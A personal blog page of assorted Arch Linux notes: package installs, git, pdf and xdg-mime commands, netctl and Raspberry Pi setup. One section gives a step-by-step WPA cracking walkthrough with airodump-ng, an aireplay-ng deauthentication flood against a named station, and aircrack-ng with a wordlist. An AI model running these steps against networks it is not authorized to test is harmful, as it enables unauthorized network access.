---
layout: post
title: technical dump 
permalink: /technicaldump/
---

## abstract

The purpose of this personal blog is to provide information about me and centralize my technical and academic notes.

## markdown

- this is emphasize _emphasize_
- __bold__
- those are snippet code
- this is ~~deleted text~~
- feas*ible*

```python
    def add:
        print("asd")
```

```java
    public class SingletonF {
        public static SingletonF _instance;
    }
```
- here is further learning format [Further markdown syntax](http://johnmacfarlane.net/pandoc/demo/example9/pandocs-markdown.html)

- formatusb stick
fdisk /dev/sdb1
mkfs.ntfs /dev/sdb1

## R

- install new package

```R
sudo R
install.packages("ggplot2")
```

## Xdg

- My define type

xdg-mime default feh.desktop image/jpeg
xdg-mime default zathura-tabbed.desktop application/pdf
xdg-mime default vim.desktop text/plain
xdg-mime default vim.desktop application/octet-stream
xdg-mime default vim.desktop text/x-c
xdg-mime default vim.desktop text/x-shellscript
xdg-mime default transmission-cli.desktop x-scheme-handler/magnet
xdg-mime default transmission-cli.desktop application/x-bittorrent

- Get type

```sh
xdg-mime query default image/jpeg
xdg-mime query default application/pdf
xdg-mime query default text/plain
```

## xwininfo

- List windows, including hidden one

```sh
    xwininfo -root -children
```

- List all windows, including nested window

```sh
    xwininfo -root -all
```

## arch packages

```sh
    pacman -S --noconfirm pass
    pacman -S --noconfirm parted
    pacman -S --noconfirm acpi # battery info
    pacman -S --noconfirm ntp && systemctl enable ntpd || { exit 1; } # sync time
    yaourt -S --noconfirm ntfs-3g simple-mtpfs # mount camera and ntfs
    pacman -S --noconfirm android-tools android-udev # android
    pacman -S --noconfirm zip unzip unrar
    pacman -S --noconfirm xorg xorg-server xorg-xinit
    pacman -S --noconfirm cowsay
    pacman -S --noconfirm xautolock x11vnc
    pacman -S --noconfirm xdg-user-dirs && xdg-user-dirs-update
    pacman -S --noconfirm xclip
    pacman -S --noconfirm libxcb xcb-util xcb-util-keysyms xcb-util-wm # xcb tools
    pacman -S --noconfirm words # dictionary used in vim
    yaourt -S --noconfirm xdo-git # like xdotool
    yaourt -S --noconfirm sxhkd-git # bindkeys in x
    yaourt -S --noconfirm mt7601u-dkms # wifi mt7601u
    # pacman -S --noconfirm chromium
    # yaourt -S --noconfirm chromium-pepper-flash
    yaourt -S google-chrome
    pacman -S --noconfirm transmission-cli # torrent
    pacman -S --noconfirm libnotify dunst
    pacman -S --noconfirm mplayer
    pacman -S --noconfirm ffmpeg # streaming & screencast
    pacman -S --noconfirm mupdf
    yaourt -S --noconfirm cabaretstage pdftk zathura # pdf
    yaourt -S --noconfirm tmuxinator # tmux layout
    pacman -S --noconfirm cups # print
    pacman -S --noconfirm feh
    pacman -S --noconfirm imagemagick
    pacman -S --noconfirm gimp
    pacman -S --noconfirm r # R languagee for statistics
    pacman -S --noconfirm scrot
    pacman -S --noconfirm xorg-xlsfonts
    pacman -S --noconfirm tk # for gitk
    yaourt -S --noconfirm gcalcli # google calendar commandline
    yaourt -S --noconfirm silver-searcher-git
    pacman -S --noconfirm libxft  # dwm, dmenu, st with xft
    pacman -S --noconfirm freetype2
    pacman -S --noconfirm go # golang
    pacman -S --noconfirm webkitgtk2 # surf
    yaourt -S --noconfirm dropbox-cli # cloud dropbox
    yaourt -S --noconfirm googlecl
    yaourt -S --noconfirm archey # status
    yaourt -S --noconfirm ttf-ms-fonts # status
    yaourt -S --noconfirm adobe-source-code-pro-fonts # current used font
    yaourt -S --noconfirm ttf-chromeos-fonts # cousine
    pacman -S --noconfirm mercurial subversion cvs
    pacman -S --noconfirm cdrkit dvd+rw-tools # cd kit
    sudo pacman -S lshw # view hardware specs
    pacman -S --noconfirm bitlbee irssi # irc, chat
    pacman -S --noconfirm mpd mpc ncmpcpp # mp3 player
    pacman -S --noconfirm gnuplot # plotting tool
    pacman -S --noconfirm mutt fetchmail procmail # mail
    pacman -S --noconfirm redshift # automatically change color temperature
    pacman -S --noconfirm unclutter # automatically hide cursor when inactive
    pacman -S --noconfirm fish fbterm # some terminals
    pacman -S --noconfirm cabextract # extract .cab file
    pacman -S --noconfirm cmake gdb  graphviz doxygen valgrind # developer tools for c
    yaourt -S --noconfirm scanmem # game hacking program, scanmem and change value
    pacman -S --noconfirm ecm # convert ecm to bin - unecm *bin.ecm *bin
    yaourt -S --noconfirm stardict-longman # dictionary
    pacman -S --noconfirm pulseaudio pulseaudio-alsa
    pacman -S --noconfirm texlive-core # latex
    pacman -S --noconfirm texlive-localmanager-git # latex package manager
    yaourt -S pandoc-static # pandoc
    cd ~ && pkg=~/github/jkoz/PKGBUILDs && rm -rf $pkg && git clone https://github.com/jkoz/PKGBUILDs $pkg && \
        cd $pkg && for dir in `ls $pkg`; do cd $dir; ls | grep -v PKGBUID | xargs ;  makepkg --noconfirm -si --asroot; cd .. ; done
    yaourt -S shrew-vpn-client # VPN: mkdir -p ~/.ike/sites/ && touch tptai.vpn && ikec -r tptai.vpn -u user -p pwd -a &
    yaourt -S --noconfirm compton # 14.8 composite
    pacman -S --noconfirm perl-cpanplus-dist-arch python-pip python2-pip # pip and cpan
    pacman -S --noconfirm ranger-git # file manager
    pacman -S --noconfirm w3m # display photo in ranger
    yaourt -S --noconfirm gbdfed pcf2bdf # font editors
    yaourt -S --noconfirm xtitle-git bar-aint-recursive bspwm-git
    pacman -S --noconfirm dnsutils
    yaourt -S --noconfirm stardict-tools dictconv stardict makedict sdcv # dict tools
    pacman -S --noconfirm lm_sensors # WTF this thing?
    pacman -S --noconfirm aircrack-ng # wifi crack tools 
    yaourt -S --noconfirm crunch # wordlist generator http://adaywithtape.blogspot.ca/2011/05/creating-wordlists-with-crunch-v30.html
    yaourt -S --noconfirm jdk && archlinux-java set java-8-jdk
    yaourt -S --noconfirm android-studio
```

## use hash for password in WPA supplicant

- storing as 'password=hash:<hash>'

```sh
    echo "asfds dfs" | /usr/bin/tr -d '[:space:]' | iconv -t utf16le | openssl md4
```

## git

- config

``` sh
    git config --global http.proxy http://10.10.10.10:8080
    git config --global --unset http.proxy
    git config --global http.proxy
```

- create new branch

``` sh
    git branch dmenu2_new_keybind
```

- create new branch and checkout it
``` sh
    git checkout -b new_leaf
```

- cache password for period of time

> git config --global credential.helper 'cache --timeout=3600'

- diff between 2 versions

> git diff 75e2a99be3d82a4ced8ba306db052105d41c8c37..HEAD

- show current revision

> git describe --tags

- checkout latest code

> git checkout master

- list all releases

> git branch -r

- delete the most unpushed commits

> git reset --soft HEAD~5

- checkout specific release

> git checkout tags/6.0

- git merge

> git merge some_feature_branch

- git display merge info

> git branch --merged

- git diff with vim

> git difftool --tool=vimdiff

- view local unpushed git commits

```sh
    git log origin/master..HEAD
    git diff origin/master..HEAD
```

- git delete remote branch

> git push origin --delete xft-config

- new git repo

```sh
    git init
    git add README.md
    git commit -m "first commit"
    git remote add origin https://github.com/jkoz/vim-bundle.git
    git push -u origin master
```

## network manager

```sh
    pacman -S networkmanager
    nmtui

    pacman -S network-manager-applet gnome-icon-theme
```

## install arch

- Configure network

## vim

-count selected words
    - select a paragraph
    - press g, then ctrl-g

## pdf

- concatenate

> pdftk 1.pdf 2.pdf cat output output.pdf

- convert pdf to text

> pdftotext

- rotate 270 left

> pdftk _stdin_.pdf cat 1-endW output out.pdf

- resize pdf

> pdf2ps _stdin_.pdf large.pdf && ps2pdf large.pdf smal.pdf && rm large.pdf
> gs -dNOPAUSE -dBATCH -sDEVICE=pdfwrite -dCompatibilityLevel=1.4 -dPDFSETTINGS=/screen -sOutputFile=new_file.pdf original_file.pdf

- extract pdf pages

> pdftk A=Writing_Academic_English.pdf cat A300-308 output conjunctions.pdf

- fix discrupted pdf

> pdftk conjunctions.pdf output conjunctions_fixed.pdf

## rotate photos

```sh
    jhead -autorot .JPG
```

## latex

## Root mount for specific user
sudo mount -o gid=users,fmask=113,dmask=002 /dev/sdb1 /mnt/usb

## Md5
md5sum -c razor-mmb29q-factory-0fe7279d.tgz.md5

## aircrack

- Create interface

```sh
sudo airmon-ng start wlp0s29u1u2
```

- Dump all ESSIDs, and pick one target (note bssid, essid, and channel)

```sh
sudo airodump-ng mon0
```

- Dump targeted ESSID

```sh
cd /tmp && sudo airodump-ng --channel 1 --bssid 10:9F:A9:EC:25:3F -w file-<essid> mon0
```

- Replay until get WPA handshake, note that

```sh
sudo aireplay-ng -0 10000 -a 10:9F:A9:EC:25:3F<BSSID> -c 74:F0:6D:3F:17:FA<STATION MAC> mon0
```

- Check pwd db

```sh
sudo aircrack-ng -w ~/Downloads/password-dir/1 -b 10:9F:A9:EC:25:3F<WPA handshake> file-<essid>*.cap
```

## systemctl

- scanning for new & changes
systemctl daemon-reload  

- disable auto suspended on laptop; add HandleLidSwitch=ignore in /etc/systemd/logind.conf
systemctl restart systemd-logind  

- list user units
systemctl --user list-unit-files 

- enable users units 
systemctl --user enable mpd

# zip

zip -r file.zip *

# Oauth2
# Microsoft 
# 1. Register application https://apps.dev.microsoft.com/#/appList



## netctl

- packages

> pacman -S wpa_actiond ifplugd

- start services

```sh
    systemctl enable netctl-auto@wlp0s29u1u2
    systemctl enable netctl-ifplugd@enp3s0
```

- eduroam configuration

```sh
    $ cat /etc/netctl/wlp0s29u1u2-eduroam
    Connection='wireless'
    Interface=wlp0s29u1u2
    Security='wpa-configsection'
    Description="Macewan eduroam network"
    IP='dhcp'
    TimeoutWPA=30
    WPAConfigSection=(
        'ssid="MacEwanSecure"'
        'proto=RSN WPA'
        'key_mgmt=WPA-EAP'
        'eap=TTLS'
        'phase2="auth=MSCHAPV2"'
        'anonymous_identity="anonymous"'
        'identity="user"'
        'password=hash:12345677888174156f8abc7caab7f'
    )
```

## install arch linux on raspberry pi

```sh
    # network
    wifi-menu
    systemctl start netctl-auto@wlan0
    systemctl start ntpd

    # git & scripts
    pacman -S vim tmux git
    git clone https://github.com/jkoz/home jkoz/home
    cd /root/jkoz/home && INSTALL

    # hostname
    echo "jkoz_arch_linux" > /etc/hostname

    # locale
    sed -i 's!#en_US.UTF-8 UTF-8!en_US.UTF-8 UTF-8!' /etc/locale.gen
    sed -i 's!#en_US ISO-8859-1!en_US ISO-8859-1!' /etc/locale.gen
    locale-gen
    localectl set-locale LANG=en_US.UTF-8

    # swap caps
    echo "KEYMAP=\"emacs2\"" > /etc/vconsole.conf

    # create users
    useradd -m -g users -G audio,lp,optical,storage,video,wheel,games,power -d/home/tait -s /usr/bin/zsh tait

    pacman -S bc elinks zsh sudo xclip axel zip unzip unrar rtorrent alsa-utils samba openssh ranger net-tools wireless_tools ntfs-3g mpd

    # yaourt
    pacman -S base-devel
    curl -O https://aur.archlinux.org/packages/pa/package-query/package-query.tar.gz && tar xzvf package-query.tar.gz && cd package-query && makepkg -si --asroot
    curl -O https://aur.archlinux.org/packages/ya/yaourt/yaourt.tar.gz && tar xzvf yaourt.tar.gz && cd yaourt && makepkg -si --asroot
    rm -rf package-query.tar.gz yaourt.tar.gz

    # wm
    pacman -S xdotool xorg xorg-server xorg-xinit xlockmore rxvt-unicode xautolock
    pacman -S libxcb xcb-util xcb-util-keysyms xcb-util-wm bspwm-git
    yaourt -S sxhkd-git xtitle-git bar-aint-recursive
```

### Github pages

`
bundle exec jekyll serve
gem install bundler
`

### CD DVD

growisofs -Z /dev/cdrom /home/tait/Downloads/archlinux-2015.12.01-dual.iso

### crontab

*/3 * * * * export DISPLAY=:0; find ~/Dropbox/Pictures -type f | shuf -n1 | xargs feh --bg-center
*/3 * * * * mbsync gmail-phuoctaitp
*/3 * * * * mbsync hotmail-tait


## Printing with cups
